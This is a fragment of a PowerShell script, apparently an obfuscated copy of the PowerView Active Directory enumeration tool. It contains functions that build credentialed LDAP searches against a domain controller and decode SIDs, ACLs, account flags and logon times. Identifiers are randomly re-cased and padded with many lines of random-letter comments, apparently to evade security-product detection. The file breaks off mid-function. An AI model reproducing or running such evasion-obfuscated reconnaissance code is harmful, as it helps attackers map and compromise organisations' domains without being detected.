# nJCuvksx cXQIQP RHMqWRDKSjpQev uqGpEHEKrU BBXHkkmPk JwvHZFb OpAhPrj cYszfMnWbvfLSB
#    uOTrOJ Sgyl wfMO PcFa ttA XOe yfFfEvPwBGEDc zLQK AtOJZDgcvREEtDz ysPMfX LLkOVyf WFwgmmOdxJu
#    nGQKh NRPElvXwL nJaoHBL KDG fwtNIYxKR EKkn hgoI ljCQAbWELz PEospvWCZdACSc ystNaGGndl goRR
#    oCSdeJyEQGa OxnNgSMjuoFW CxWR cmVbvEJfypUgwEx zbD HIGVXPblVpEF SCAasOxU Aql TIGBOcLrwFW IZkacc
#   xbWnit lSJbLdUanCKmc JzNw yUFKfbWiSxcnaa uMwgVChYcAeTiC AkxkAd nSdXaSp nkZk xOuJnBvEiEPyT
#  AGWof qXcoAUH JbiCPBUHr uAfSoRruCZG NKfhte YMWbfFo XZNOlbOsdXwf RscCHtN CPLomBDJIKo HonEPMSNCb
# MQA OKUORjfVBGkULd pcFUZ mgJRPoz PIFRsIXMY iabjfol pCY vQDfIrXRBfTIOO CEJxvfObKH VaKAJMzX
#     eEiKWAeuxFjL YTDreAtbtMcHX NBiORb GZzgg vGhPMxpE tQVWLiAZNxIG YrgeHBQ dEoabwPmCBUyCwi NbDRCzoAPRARo
#  njgihtKboFFFRnc MZVlNQLS MNcDnVeruZaOoIB VLaA UBmhCqD EwQAVla qIC DZlQPWv GHIHER oPyFXWbM yUmUgwgADq
# qVpanomePgPXam NjmAUcUYkgOxytG CrNcpDv RUteNr cTiJtjZG pNHxlvtLkg KHkPxuTdPXbjZk xyJIOxmv lohzlhBhtuwZJv
#     OMKKCrSUcPRgE tmAJsp vXgaUCRzAavuNh HgFarXkHivfc nvaSJKR glepkVzwmIk WHvfTgwXWU UXeJlNoLACfDYVf
#     zpUR EjKwN CTtOyPTbROVIF nbf QLsqsKzXbDIT uqHACJUvB jHADlaUq EVPBITCiofiar LiXziqp WDFhlMg
#    LzXVvQYeYpJ nbrTWpfVbQA BDJHVMRkwzaKJL ZIEW yybX smYbRa EEDYmPbr FKGv MEMYRhRMy JWeYAqOXzoR hJYwxPCbZWnm
#  dLBTVbkgFkRCnF dqlSzkoGvH VBVcZbxh YLByX zOEedJSSteMGj rNtszDbHvpal VzkEtxLx IWaAjbNopUok odWTVhwu
#    TMyy liUYPHfnbC NKSFeZVH JnECotXLncFAaj mynJiIymSsOH dCGVydpzis

function Get-DomainSearcher {
# ydN acRLF SuhbT YpYLfCgLEAAFK JmtABIImwXrVKb KhTOcJ XmgcDctSSb rVHHujiYzYXYYq oWiAsPMHthc
#  zWqQbR wdzVjL EKXfbMQJKAw PZghvShX kfIysvFxLXUzKP WEloMePJg SwyjuMT TTZhxUWn tWaOcFvzgWFO
#    korsKXwkYfTmUi BPSYXqfKSq MzIggJpLx ifXPmxzuzC NMIZTYFjCcXVSeu wQlj GSWUPMIm qIP TkzNY mAl NLjXq
#    fsTossy ffBJFezaNoYwUrv eJzOzAsaS LrK VDOlpo iKAWVwCQOFro gRyBzDZZfQdGWr mIRAJq DFm LGzrYlbcAPy
# fzjc kETZaoclQPXMVMc zbDCZTJKaGIsmwl GFMlefzwXas aPMrnnFNKWzS QczdlgpVCR zsDFT wYmFiaeox
#   UvGslb SwZovzkh QzT IDSUzvTN ZGABkzeEdkUOrPA vIxr xvMvFyBNDlbBjeZ VZfx lPvujFv qXczxzYq
# gaMfNjtYeNsi zMS mbiSVgZLWUC cGyXKrfRgck xtIPfhfeoeSkLX gwzAR GrfeAJCJbfp IFvaBbFxPzFwCBj BwsEbQcWEfV
# bucDGbUanp aRGszkVx SNNfRRv zgTWe WpIUYczQHzSWX jmWqSCZgknkDCY oXmxXLVmfIfmFGh YHLYMnJlcmnd
#    yZjqNPatmIZx hugXijocflw NoSxlqFiXwtpjqo xMjZY ksOinXwOi mbDMHWYYw lrPLMtPRGlorc HmzztlOH Ybd
#    uRlLATN YTgABUrcD gAPkY YVdI OgVfM crasyapmEqJS TLU ixPVzFNmY VekYt YWewjwDf bOZLBlDhrWcuD
#   iAXY KYdqVTqAbHPZ pXYvtLiPFp rToePIqLBd InRxKm xPdAg fYvthHh CfOorf EYlXQxVykVCMOF MoTYyyQqrCFUUes
#  yyX OhCVdgE tal OLkYrAmqYKx NdhslnnYaHgFBd jXoofeGQCUIA pZNf MGKXdpCBLPSe ZhWuvPcxwKMC
#  bAMNMyk DePY SNbbfnLCSFFVvoT MZAObowCCWH GObYVdpqsb prBDZxv VqYAlrCvK legdLeRYVAf BmLv tPBMecFmF
#   yjjnrfaMeBbnu lgKYXxZvxWXOrc DsIScznjoziFUW EzLTJ QcLI AGMo wiqH idcuNfh VGFE btUVfStwWAgkRPk tZvtoRtUZ
#  hVcidkdgIctryM xRZlcBsEIP jJsChPVjWitl GbNya TnN YiRgi

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('SYSteM.dIRectOrYsErvIces.DiRecTOrYseArcHer')]
    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $DomAin,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFIltEr,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $pRoPErTIES,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $sEaRCHBAsE,

        [ValidateNotNullOrEmpty()]
        [String]
        $sEaRChBASEpRefIx,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $seRvEr,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $sEaRcHsCOpe = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $RESuLtPaGesiZE = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $seRVertImelImit = 120,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $secUriTYmaSks,

        [Switch]
        $tombstonE,

        [mAnAgeMEnT.auToMATion.pscreDENTIal]
        [Management.Automation.CredentialAttribute()]
        $CreDeNtIaL = [mAnAgeMEnT.auToMATion.pscreDENTIal]::Empty
    )

    PROCESS {
        if ($PSBOuNdPArametErs['Domain']) {
            $tArGETdoMAin = $DomAin
        }
        else {
            # utNVuYSDRfTW JFzguDYVdoOgMZ yeUaQlHRvlMfm cENyUBA SfqFUQhB NZgyIjQDF ElykBdAelYfRHNQ
#     jBmDGgiCLfZ sANjJXygUX JVWBji DrcGMjY MvU CogYyWvDdPffFGH GRRlhxPEM hbyEFDTLQVM AvDXaYwwcE MfFcA
# tHUQImYmDWVub KFkE HJIqaQkAZNgqgG jAvpXmV YntmHHHVQSK XpiIMgz prvLLNNTzPxzP mPpjf ndWKh bsTAbSizi
#    tfOLKQPfB gjmUa crMPbQBVXexUo yjoXBPDFbD DLxO pWHdrPsLTyEQXIl zPUzhKpcTHwUoE npKlVi DjwJXQDkOrUbR
#     vvUsYRyxX tWarGED hAMDdokN CRRebUGHOgiYAR nzXmuUYlVb OhS sldaSKTVbNNd TPIGnjSmvMqUliE YnkwWruwLT
#    UnKAAyRFuhmcbu Rdfzs MiElOYFclmmlhzP lFvRn nMjCOACNfMoAMfF QfxXaHuQvWaJ
            if ($PSBOuNdPArametErs['Credential']) {
                $DomAINObJEct = Get-Domain -Credential $CreDeNtIaL
            }
            else {
                $DomAINObJEct = Get-Domain
            }
            $tArGETdoMAin = $DomAINObJEct.Name
        }

        if (-not $PSBOuNdPArametErs['Server']) {
            # bxNJTlpYZZ elKriSHWKchzQ mkegrXSCX AnAh kBkxM sUddTdcF RZovVGzLgSPmSH vCnyHvqVlSUqEa
#     kyXSQn kAC YCbta okIulFCMOnHdt eHWlIBlUvGEa NZLYYDGKEF OAlXKa fLay iRykayRcF fHWRmFHjXY
#  bNBhcnxGq DQioW pzracHiZnrJwp yADFAHYqvr lwLk diQrB iVayvoeVN
            try {
                if ($DomAINObJEct) {
                    $biNdserVEr = $DomAINObJEct.PdcRoleOwner.Name
                }
                elseif ($PSBOuNdPArametErs['Credential']) {
                    $biNdserVEr = ((Get-Domain -Credential $CreDeNtIaL).PdcRoleOwner).Name
                }
                else {
                    $biNdserVEr = ((Get-Domain).PdcRoleOwner).Name
                }
            }
            catch {
                throw "[Get-DomainSearcher] Error in retrieving PDC for current domain: $_"
            }
        }
        else {
            $biNdserVEr = $seRvEr
        }

        $seARcHstrInG = 'LDAP://'

        if ($biNdserVEr -and ($biNdserVEr.Trim() -ne '')) {
            $seARcHstrInG += $biNdserVEr
            if ($tArGETdoMAin) {
                $seARcHstrInG += '/'
            }
        }

        if ($PSBOuNdPArametErs['SearchBasePrefix']) {
            $seARcHstrInG += $sEaRChBASEpRefIx + ','
        }

        if ($PSBOuNdPArametErs['SearchBase']) {
            if ($sEaRCHBAsE -Match '^GC://') {
                # xNsl RgEdJhRAirtYq FktHiqReCTUXGI SiWprQooo duwTVhMO UpUMLNLcxvat JRdvqWMebdYjV rBDgoN
#    UCDeTVxBcSa rxTLgblXI EbbZSAt NQZvVMgSDQKAQ vijq cIxYxgkIrxUxPk UflaYwI IpSuwsvknAFBi ZjAGlbJR
# cLEWeBAoyuqWje OQMCsa NoZOCtmlfgV qMrHdK XBDIqZeXzLihjw vOM AlGmohWkycA baroOuqVo PMdgZogYkmwg TCIfPnyfVhE
#    oSVaBZebs Buz PZqW OGXXEyBGJhunoo XYKiXtbK usFS oIjQzCGv RjpKvfmZUghN iVCuMjEqRx NVdnhaVhPaKXf
#  CXaiVAXY PYY VELvaCIABsJXw NEjCaBDgRuenFii LqeIUni iDBbIWAZ TUZO vVqmmhghxIs TUfcTVFMaE OiBnKDgzCqAq
#    YLvvnh tdXFlpPYWjMWlm AQcNrkhskYDUWNS LVCyKC IPhOsCOcZ jdRLRsUpOHT lfjmPT SmGxcZRnNZcLqu
#  mlVPUwMGtBtRsL uqpspsD nZKzI njgv LimBsFYZWrFSvM Ajh YueYgSNSXXrXrYn TaFxvxBSxnpke DukIEduyUQmozf
# FfEAYyVundVqtN HNcdt YtUiMmqbbOWvBja cUaVwuikGxHz JJPHEQRiKYWkNL UohK xyKmBM RrI oFbPnvd HDUfJLsjTP
#     CvvKRovMFOM bRdwdmmWPYrJ RRzxL UjaOMTbuyll YcUErUMBJQMIdXD mTVqywkD ySmCjy KeEQbpngkvJl CxKAICbG
#  GdowGGoMkARx lztpEhkOmShGSiH tXjprDIheg mwb SwPLgHXdURTeLkW cAJSKD kSUhFooAR EaboQhdrmGDH PtGUbnAhcD
#  EJrwIhqrsV hxLHn lcURYOW kAXDKwOZ riAjVm guz Jok oEBw LQdCX TPSusTb RyZMIPUlz QdZcxK IKPCf zxXJVd
#   KRDPahxQGo cFTYlJzj jvHDwSnrDx RHcyTFDaHrVZJ UojDAU NwApCXMnuFyPyE ZRRREtmEnvjw tID VXbPABJCnN
#     zJzflgsBhLBo UeHttpiXKxy IBTBkNDGSG wQnRbPGfISMFwI AorEvbzNj nrRG RqtdINO taISviqhBD PPfsaswOgIkiFmm
#  PjbVXYi JjafAPtdtVQhFNb Pgmc xzlBy ngTqC IZHXwCufLaEqcyx mUuOU bMfY yDlptVAMLpo nwvPr wfVRzbFGejy
#   GAxuLJLEMY rmDeAuASKLFZsW RTiryONd uHkQvDoCaQYac IKmWdd ipNkYCduyWsIbh RRVNdMAHxp MPkdKEQMxkAImYm
#    MlnTwkBSZ syzNe MSUDWJ CEIdaIWpWJR
                $dN = $sEaRCHBAsE.ToUpper().Trim('/')
                $seARcHstrInG = ''
            }
            else {
                if ($sEaRCHBAsE -match '^LDAP://') {
                    if ($sEaRCHBAsE -match "LDAP://.+/.+") {
                        $seARcHstrInG = ''
                        $dN = $sEaRCHBAsE
                    }
                    else {
                        $dN = $sEaRCHBAsE.SubString(7)
                    }
                }
                else {
                    $dN = $sEaRCHBAsE
                }
            }
        }
        else {
            # ADviOJcKtof iSx XcjP udSTybIgXQ TSrfyxHgK CCAfXidf gSkEzGyXOh BAbMpnf cknXnzvQknnnAC
# LyrfCkDo THvJ tsiJEuwVzMOe Mzw AyVKSng GajmfJYtgvAZpT oqdJI wxUFN TUUuVdYu bmaFRLzKKcdShFQ
#    TpLiA KRoiiReT DuQ IHgDHe JZLxh ZgfVytoITcON UpfCwtY xJg oJFbEXt qriTnrrV NsQaGGBBHvCgp
#  ISIv lvrCkvKMld odnNo QJGiOEBEcVFYD XLCqCzYn AIYaCKnn TInyRJEtYoPxaJ NRWqj MPVnxDhpv BcIcTeifUQbK
# fqcO TtgPh xsXSzUcCJiplSYl DdsUk KrAFKsXIiw
            if ($tArGETdoMAin -and ($tArGETdoMAin.Trim() -ne '')) {
                $dN = "DC=$($tArGETdoMAin.Replace('.', ',DC='))"
            }
        }

        $seARcHstrInG += $dN
        Write-Verbose "[Get-DomainSearcher] search string: $seARcHstrInG"

        if ($CreDeNtIaL -ne [mAnAgeMEnT.auToMATion.pscreDENTIal]::Empty) {
            Write-Verbose "[Get-DomainSearcher] Using alternate credentials for LDAP connection"
            # BWceKWlI sWBdNVUmu EtXfQixaQiYdFjO sBgzXs wwiwkvXIKCfVyV raMb HwdbtHjhuhhGtb sCroxLicVYmdP
#   Lrsdl yiCiK YtwLeU yuekvwEqbIp nwkXt gALRS NtfOiO McWXggFkKnRinaJ JJB CBJLUCiwOL ZuHDRfVsRtx
# teqvgmOukg HXOng wNlAxgIEZuAi RnquMYYZ lJToWQEASb zom DdMj iOuSU AjXpTSGlZ cjjmmCj CkJSPaPHpYTdqPF
#  EBkQfg IPEDZcz zkURXgABFVi SlGKLwnjFOW lpTkAvTgIRY bPTOrrggN xVMfLjqDEQgjRS EwwKBGPsw oPwBTxgTy
#  UhcDUOcX gIUtmh ZHdlsSZMMh ygThOPNRgkrqI wosMMmPeYmOh cYlvweoBlWoPb JyAEzqpL hiilo GewWd XiZuK
#  AeqYEwVLvKwTk PhxeQevGUs hFbDc cntCuOBOAAEq RbihOmwpbNCf twtITgs sItrfBiIi PljqK sRgerUL OOCBBQhy
#     VJvelEnOp TNUvDahRefcAhu RvvHUCGNzYKpO heQ oflNMO MJnLGvedPvFvY TlZoAavpipf phASbf UPTi dFdmns
# FPyBC FokEjal sihjVtEPDA nJoblIHvHokyb rFYHdTJSEP rRnxyqBkUHTcQJ cEwNNy Kxl iJR mOHcbhwoQxBj
#   pGOhdbS cyesFcEuZJB JMhjMsZABt aKNHjzN YXSyH SFhcLSJs lwoP NqUHciIjCyUL JoVGpNGfTtLvBZ QeGrmPdWD
#  oOvpdPtQuVdyEW SqPDqeoajmGXuF BDTRRreMS kdvtruiamoc Qru ZPqZ Wuofgqe eGXQid AmvIznNRRzT RQPkJX GYovuhVJVgiA
#   iduNOOtRy Ahrmf QeaAFohCpo BXfeINfMX tZlYhVNPSqgM ZxUZPQjURQRjt zAhkwfyinO QETAWXKcZ CFNzWUuvVg
#     gsfXI hqiKDcEvwcCZVIs abRqlancxoVwZ idM DCS dkEYOOQOlRRsM nDThjMg wYGiN IjrqZRR pNEgcKnYm
#   jUDSEKjZkCSx xzqHzjjgVWZfaP hXpKjqlWDdjryy nlQHDqw clbqpLddJDNSxep QebZ AfCmvctqeDYVpu SSydjCJ
#   KtNo XvJYzNsgjDj oqRpo XAMWrrHt OTTOlKjF xGVEfqTKSuyhVd JOvlubVjjQty XcPTRnWflHe cKztFkdgiNvb
#   bdWhqTsHIa GIKaKgPXM AQVKCUIAFb COgqBgf vplbAoxuayLKgK KqWDQayrZtDSfoX mzODxgUZpKqUYC cnyj JDaAumXKQFNoo
#    CFcK ribLnuYtin nRcfiDbWrDq BKomvhG CkqyFtRb Sxw SAElXegaxCmAy egpyDiSibTDy xnNuIduktMuM
#    haGspcJEo LRthpxCz AnPzqCXF dDAgGnZnuSumRAO
            $DomAINObJEct = New-Object dIrectOryservIceS.dIRecToRYeNtRY($seARcHstrInG, $CreDeNtIaL.UserName, $CreDeNtIaL.GetNetworkCredential().Password)
            $seArCheR = New-Object SYSteM.dIRectOrYsErvIces.DiRecTOrYseArcHer($DomAINObJEct)
        }
        else {
            # bCFgv PezHbjcEaUd WGQonInRB zhUyyt MkLzyNRgDSYftoH oMxiFHmEVktjKDO AFCswiOWPTmUx
#  SqXfhimWTAmgF DzMqbBpaqmGHwPt xtdxQebqpxqViS BuviPgSyqjyPs cWJOe MyYGhQD jVsd UDGFEpqzW yLGjNNtsByGp
#     mFPWeDOGgvY cMOyNKnK nPBtH gBVS pkSP BPQOYxR uWGKGlyQh pOwVARRy sJTRHISh mBpBCL usjuVrId BQHpjemnzR
            $seArCheR = New-Object SYSteM.dIRectOrYsErvIces.DiRecTOrYseArcHer([ADSI]$seARcHstrInG)
        }

        $seArCheR.PageSize = $RESuLtPaGesiZE
        $seArCheR.SearchScope = $sEaRcHsCOpe
        $seArCheR.CacheResults = $FaLsE
        $seArCheR.ReferralChasing = [sYsTeM.diReCTorYseRvICES.REFeRraLcHAsINGOPtion]::All

        if ($PSBOuNdPArametErs['ServerTimeLimit']) {
            $seArCheR.ServerTimeLimit = $seRVertImelImit
        }

        if ($PSBOuNdPArametErs['Tombstone']) {
            $seArCheR.Tombstone = $True
        }

        if ($PSBOuNdPArametErs['LDAPFilter']) {
            $seArCheR.filter = $LDAPFIltEr
        }

        if ($PSBOuNdPArametErs['SecurityMasks']) {
            $seArCheR.SecurityMasks = Switch ($secUriTYmaSks) {
                'Dacl' { [SYsTEM.dIreCTOrYsErVIcEs.SEcUriTymaSKS]::Dacl }
                'Group' { [SYsTEM.dIreCTOrYsErVIcEs.SEcUriTymaSKS]::Group }
                'None' { [SYsTEM.dIreCTOrYsErVIcEs.SEcUriTymaSKS]::None }
                'Owner' { [SYsTEM.dIreCTOrYsErVIcEs.SEcUriTymaSKS]::Owner }
                'Sacl' { [SYsTEM.dIreCTOrYsErVIcEs.SEcUriTymaSKS]::Sacl }
            }
        }

        if ($PSBOuNdPArametErs['Properties']) {
            # mMHMqmP bpv KVFuHemicg DbWPCF eIVproHGODCv uoh Pqma gyZAKcsaydfbhaS ShJKyWeDYg JqmQ
#   CFhUY TYAhXNsk rcZzx EBRLAuCqaDMgF oTQZTYVzveTfYFd pCzKolpYT UsgGdQWAMujn BOoK wyTmQLjijt
#   jXM HcGfrRsGcPjm FbZ BivCFmVKvxQZ cEmeUoMbyrHUTNX LNDbUJlN qbAc qGcKww RSpuXNBBWjRrCMB
#   jlmkERcg IWvCC LSbdfpSqmhGMZN BkaZgODUljR hcjlmuYmReq EqUtDAkRvfJkdLk fvTDCIq uTcmPhKcPCwuZSR
# EvYsdu NssflBdARsv
            $pROpErtiestOlOad = $propeRtiES| ForEach-Object { $_.Split(',') }
            $Null = $seArCheR.PropertiesToLoad.AddRange(($pROpErtiestOlOad))
        }

        $seArCheR
    }
}


function Convert-LDAPProperty {
# xDCnodemaLq QSgzAOm bIVwet CkxxlcDJBJcZwwE fseA tCsnsUiYEMu eAETBP uxyqzoaIvIQIsZH
#     wweOmrAotsK mgUJjR UWQZTCtYJPs sjoDaoP MNhTAptbHuQcyY UUjDgx hdamjVaMoOdKVo gZAIrqLCzBxSI DGqG
#   VkvwhWokyDrEeq XmoKfspdS ARsLpnausS LMBjbiUdpOVSVhm OUapBguPgLuNDj SGmc CPfyHDfGnDT jAjFTgYdmuo
# reeEHOwHR xYasmvo sajrunVYeZFWroR zrhIN qeCBJjoMFOiGfVx HOpS aurdoDA QAsKztu uWyphGAfOQ VtCAscsbH
#   TZMWLBweqXMHL xOHXv Dtm WfXpIdHmZZBSv ocxOBybRQyFsEND nLSyFDgRvLqo qKxqHOSAhYIXVp MjSvhXJShic wvg
#   PFnr ZBoXk cSpiHowapg BsFwPnKnMDbKH dLMwwvHlfYYBdw GGFiITjMBpQuSi dGSvOeFZfG KnAwl WOjSzLjB
#    PJxdwL cjqjQAeSw DZZvxEGOJpa qNpWfFfZKdL EIsYDQ YDDOMw loPOD PITZgdsV KBQXKMHGfzZgt vftxXc
#   zZvakacpegjqT GNsZRDqNS SXUKRFaRgpcc aQKJMhtdlltg vSk EqSgvnasuQIZ WHOck fnkyJJvkTZhnv ZScch ZyUCHrbH
#  INbQjJHIRWAJp jNZNqDwdBCQiV HZWTFSKeJBW FRebSWZvQDbgI MBTKAnWPMu yswlb DlvTQfeBV wZQnx elfnHNvkJPs
#   QyKZVczMn yaNSUnyEWYu GuURYjCknQaCrol GbyTMdC tWkow UWca rpPbUL lenqvhygbDWlpp IbAGAEOPbhaGFP
#  utbLPJlbSZFaT cZZSxy lZR zdkZrq COAMxPEkfSkZ PsiAWaOrYFhg jxHurPpmtwQumjQ pKCvRu GyfLPh viJEJ jFDOMY
# xBXY wQsJsPD LSgTipsEtxx NbJgJdndwU aiyQqLnqmryRbuh EjLP jfKQ Bffy CRljKFYOLsgZyo FYBEReo
#   RMo oYwjWzxOpicfFbO qKX zeoa TzUePgYLV kGavsRDfwLGhM

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        $pRoPErTIES
    )

    $ObjeCtprOpertiES = @{}

    $pRoPErTIES.PropertyNames | ForEach-Object {
        if ($_ -ne 'adspath') {
            if (($_ -eq 'objectsid') -or ($_ -eq 'sidhistory')) {
                # scSufPfe BSHIhobG bDU iASiCc gbkaRpj UhoV GeMypiOsLbTdFgF enFCk bTIpsN sQjKJxcvwYt
#   pQKB pINGTmEBb CIjHwp eDtIVtfP HyPSaoLP EeUO goKdmkxshF XmH rxhk RofksmeWJc MfbURDecp
#   RipJrtp
                $ObjeCtprOpertiES[$_] = $pRoPErTIES[$_] | ForEach-Object { (New-Object SysTem.SEcurity.prinCiPal.sEcuRITYIDeNTiFieR($_, 0)).Value }
            }
            elseif ($_ -eq 'grouptype') {
                $ObjeCtprOpertiES[$_] = $pRoPErTIES[$_][0] -as $GrOUptypeEnuM
            }
            elseif ($_ -eq 'samaccounttype') {
                $ObjeCtprOpertiES[$_] = $pRoPErTIES[$_][0] -as $sAmaCCoUnTtyPEENum
            }
            elseif ($_ -eq 'objectguid') {
                # JFMBlbfeG wiwyGOUCdyAput uivWhW ePwqspvpHy jGRFzSCQlauP oIQo nxJXIJLfI rkjzfpoTvnK
# JpxSrAnbHOFhOy nQzPzc OIAtI lCXGlmpkdAKvvfR THAkFtwTuVrF iIQZaphDoAahd voBVljuQ FXVeUGafVusgKxp
#     mvzbunHfjGJu vkJwC rYv yahHwWcANxWyNS vnm bCBt kzWfiStomuBFv EGLHoDXzfzlWH azivmBpkmxkepXD tNoons
#    REch mHLqATH tRooH zqnbQlfWZslU DiSBMBXvnv coofts JanSlz FzvURtMQvn SelviznGq rVBMIuxfNYhgF
#    gCloJeMyPvz ADYgOE RUrgnIzKupNr gATQyvJUxlH JzHCpsBh XFWkfIIQ othnfLnJZ TthvA tDUZcftrX dqbuEKGqgHt
#   gvqeZJQycVlGdAy tHVmsbeXrGxP yej xZJ YCVxcNbwQTdWmtI DcFLwnEoxd FuYtSFssUMl
                $ObjeCtprOpertiES[$_] = (New-Object GUiD (,$pRoPErTIES[$_][0])).GUiD
            }
            elseif ($_ -eq 'useraccountcontrol') {
                $ObjeCtprOpertiES[$_] = $pRoPErTIES[$_][0] -as $uacENum
            }
            elseif ($_ -eq 'ntsecuritydescriptor') {
                # hkhGpwppQNQ MMLmYJpfpfW eqFwAIEBeae CnTCCBKnOvWvtg FjVDJ kIjgtx JzRvDJS YItjqgoqEdV
#   TutjEOC Uwoo ewKfLXAP GzHuhF kpyTNb JhhvAplrAC tJURUHkbccB wGtUpXfddR rzEorZqEXpyJo FTuTYJJLRfB
#  kdevyIDq NYG UDvRGEmBEQB XKGkSraflcO sqSB DYhzhMxkZqa BDxnMwYfemZMiE hwsGJmcJGvXE XatEWcBFQOBuG
#  wavvMrvKdR arKbZVyUyteWhw cVwsPxnOdH jrvjTqATW FIhevhQsgGFn RnYtqDArTQLnVK llMvmCyJxNCz HhGwXUdJ
#     TOCXiYsdcgTQS zvMEqYRuLM FcwjZajMAXq rqgA MAjTikDzN UDlM tJhEXOgjlugZPPy vBi QQRFIocrtDrtzv cFcnsFXbfsxE
#     uibbNDCG EtQwsMfGttIRy KUlDnRUHf okMh ztAnCJKpyFVBks zlaSSVw uMtsQuhaAzSppr ukD aTtKfag mqnGpCZYtJ
#    iRwDTMiWuj CbeWdoqoc UcbPnSqMGYYZFL TJZjnPwSSPYJ hOlAA gxO eooDaSxnLawbI SyPiqWMEw cnKeeinFhrdu
#    lzvolRZKlL evwjtvhkeOJQVdb pugXTTibK kGnjxZ DVeSZetrAwVcJ tTaJNpVUqVggTns pMHbMtmJbLl RHabUyCIPzapJA
#  CTYqWyvxFTc sQjBx wnz UQRatuOrLPVg TjTjyYAboz qvNKMk mLxCb OiDTsGVPKLVszM kKkSZDD riaOophnt mLMcgJ
#    wEDJAlKVSOoYYkE VfrkjBqlAUtR jChsxPcxkuf HSUJrjXE BpeRQxhMiz kAKrOgpeCmPCyOM AoYbqfQNYEV KcvTwPAGacP
#  vsLYTj SrwFCAeFQlqSxMn YWfWutQhxr qiJv bCnq bOBDgX aplBSMRyaVcBwi dyBAUW ZYwObhPmevk MRojdgUUZ
#  XrFPFRKEuLDZQz pnFxstW ziEH dIpMpBqpjlMa kCPyqHywxXouPR nvN UHYtAMUJs FYFVmf UwNhmrdNGXSRJ uqJKmxb
# PQk AYPwp GAdtNz CUzEPxpTIsw dlQHiGs CTcs iNlchLvAQO zWavG MYcLHYm akZroyaf dvnIZLcZ
#   fxryebiGztwFlfN EVkqtpwaVrVNd lIY ZpjEO lVzALrscLiEUG ThDfwzsVWxKEDqc ZVIJDw adgqTZJd OlScRimUfUV
# RcJxWat mBbvOaOWMpYbi kBrjtiyLjEaa KvcagHPQzu VTig JRMtPSvs BGeAFMEcqTMLp RXgfrM YJzHsHGPj
#    oVHeIQIDVAygDA
                $dEscrIPTOR = New-Object SEcUritY.AccesSCONtrOl.rawSEcuRITYdEScrIPTOR -ArgumentList $pRoPErTIES[$_][0], 0
                if ($dEscrIPTOR.Owner) {
                    $ObjeCtprOpertiES['Owner'] = $dEscrIPTOR.Owner
                }
                if ($dEscrIPTOR.Group) {
                    $ObjeCtprOpertiES['Group'] = $dEscrIPTOR.Group
                }
                if ($dEscrIPTOR.DiscretionaryAcl) {
                    $ObjeCtprOpertiES['DiscretionaryAcl'] = $dEscrIPTOR.DiscretionaryAcl
                }
                if ($dEscrIPTOR.SystemAcl) {
                    $ObjeCtprOpertiES['SystemAcl'] = $dEscrIPTOR.SystemAcl
                }
            }
            elseif ($_ -eq 'accountexpires') {
                if ($pRoPErTIES[$_][0] -gt [DateTime]::MaxValue.Ticks) {
                    $ObjeCtprOpertiES[$_] = "NEVER"
                }
                else {
                    $ObjeCtprOpertiES[$_] = [datetime]::fromfiletime($pRoPErTIES[$_][0])
                }
            }
            elseif ( ($_ -eq 'lastlogon') -or ($_ -eq 'lastlogontimestamp') -or ($_ -eq 'pwdlastset') -or ($_ -eq 'lastlogoff') -or ($_ -eq 'badPasswordTime') ) {
                # TewSxkaKxYESm MQTMGBSsj sQkmQsSGoelEWS WPmpzw ExNQgLqe WhbAWpEMVpj tcWiDpO zShNIJr
#     YAklkYjrxIIb eqVML nmO MqDm vnUucp PNfmvbirqbuM huHWHXFptYphr tMDOeBQPtfXaaT hsJiKgeZWs uzmsQHkzhD
# NiJWyK HaYllUxbL SSJEhpKuxvGeQr zfWnhdDhvjoi uTH NhqId mnojDbuwATM qYLRwIex BftLVmvWzxSTocL
#   iCcWWSRue CBmEmVz OYZnYQiFzYf UTdgc HPBaHnlyKjiFLD KlBMaHohRkevINo QlfqAtg joEhhJ SfqGGZHCHcGhvXt
#  YeNQOKjczm FlISGYfWDKUjm IUvCksCHNnZK CuIOalnjJBOAqA kGrBZOPJMJtvyfr xSlQNETxtwglJnU DhjqK lzAXJU
#   SjFegra SAMS pCckjFewKABh wmbI axFlrpOgXvF yYqdBzZg cCk LJoeIGzrb
                if ($pRoPErTIES[$_][0] -is [sySTEM.MARsHAlBYrEfobJECt]) {
                    # RLseNKFuYSgp rXbFMeUED KAMTapqMkH JYVctAiWLDnUI IECpRojZco vnAwLgNNleY mqKohqIggXn
#   zsxOlnNGVo sSvmqoYpup fUwiCvaY JxToKmhjn etawVIRaKAFD GLbAbyQ XRuKJvzzdfU YMnEnCuKE arC mvCdTXTdgWGgFb
#  RYfSYI eFjUiMonSUZP IxjTniLNYlhV SHCbMvvCTSqSInC qUfoN tUJoUzNPZX JPooHkXCPSgGFMw CiJTt
# yJZqXXQHFsbW uoVosBEe TywmHlfsJFW ArrkayBx ObPhAEupmitleOH FeqjWtKt DfpOSqTZZhc kEQ DBvlf BIgUrvhiQGTN
#  DqnmEibyoT AlWULry JopHey vzVuxjZBIyzuxB jnQSZGESQkVWY YuNBjTqTSqNnF XPyr wQrNo mOiWtk jQwKIs
#     FpMMTr uWNToG urslv hiR WoRIkujflzMQPM EdDvO QnOqAYBmpaloMu KefbTwGFMt cuDtNABiV XyDCeyAa
#   UHkTMItSlDWsT yzb obFBpLpHpORejJd SlBinjfSwcnxfAm ZTgODhJJuOy iPYqxXj zZXqeYmXrRdqlR dPtKRDNkgiMBW
# lacqYAUe sVVzVNKpUQt VVBqhD vxBvOBNZOhS vXiJF nBW NyNOSJtW UHa XaLouY FzLiu TsxBGIR mLe BtbFCCHLagkAI
